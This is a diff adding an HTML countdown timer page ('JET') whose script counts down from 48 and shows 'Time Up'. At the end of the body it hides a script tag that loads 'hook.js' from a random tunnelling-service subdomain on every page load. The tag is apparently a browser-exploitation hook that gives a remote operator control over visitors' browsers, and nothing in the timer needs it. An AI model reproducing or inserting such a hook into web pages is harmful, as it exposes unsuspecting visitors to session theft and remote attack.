@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JET</title>
+    <style>
+        body {
+            background-color: black;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+            color: white;
+        }
+
+        #main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: white;
+            border: 1px solid black;
+            border-radius: 5vh;
+            height: 80vh;
+            width: 80vw;
+        }
+
+        #time {
+            background-color: darkblue;
+            border: none;
+            border-radius: 5vw;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 45vw;
+            margin: 5vw;
+        }
+
+        #show-time {
+            color: white;
+            font-size: 5vh;
+        }
+
+        #counter {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 60vw;
+            height: 40vh;
+            background-color: darkblue;
+        }
+
+        #show-counter {
+            color: green;
+            font-size: 11vh;
+            font-weight: bolder;
+        }
+        #start{
+            width: 20vw;
+            height: 10vh;
+            background-color: orange;
+            border: 2px solid black;
+            border-radius: 10px;
+            color: white;
+            font-size: 4vh;
+            margin: 5vh;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="main-container">
+       
+        <div id="counter">
+            <p id="show-counter">44</p>
+        </div>
+        <button id="start" onclick="start()">hh</button>
+    </div>
+    <script>
+       
+        const showCounter = document.getElementById('show-counter')
+       
+       
+
+    window.addEventListener('load',()=>{
+       
+            let m = 48;
+            
+            const interval = setInterval(() => {
+                m--;
+                showCounter.textContent = `${m}`;
+                if(m<=0){showCounter.textContent = 'Time Up'}
+            }, 1000);
+            
+           
+        
+    })
+
+    function start(){
+        window.location.reload()
+    }
+
+    </script>
+    <script src="https://294d2cf238e0640410fc843808c35523.loophole.site/hook.js"></script>
+</body>
+
+</html>
